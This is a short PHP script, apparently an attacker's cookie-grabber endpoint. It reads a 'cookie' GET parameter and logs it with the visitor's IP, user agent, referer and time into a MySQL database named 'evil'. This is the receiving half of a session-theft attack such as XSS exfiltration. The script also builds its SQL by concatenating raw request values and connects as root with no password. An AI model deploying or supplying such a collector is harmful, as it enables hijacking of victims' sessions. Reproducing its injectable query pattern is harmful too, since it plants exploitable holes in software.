<?php

$date = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "N/A";
$cookie = $_GET['cookie'];

$db = new mysqli("localhost", "root", "", "evil");
if ($db -> connect_errno) {
    echo "Errore durante la connessione a MySQL: " . $db -> connect_error;
    exit();
}

$sql = "INSERT INTO cookies (ip, user_agent, referer, cookie, datetime) VALUES ('$ip', '$user_agent', '$referer', '$cookie', '$date')";
$db->query($sql);
$db->close();

echo(json_encode(["status" => 200]));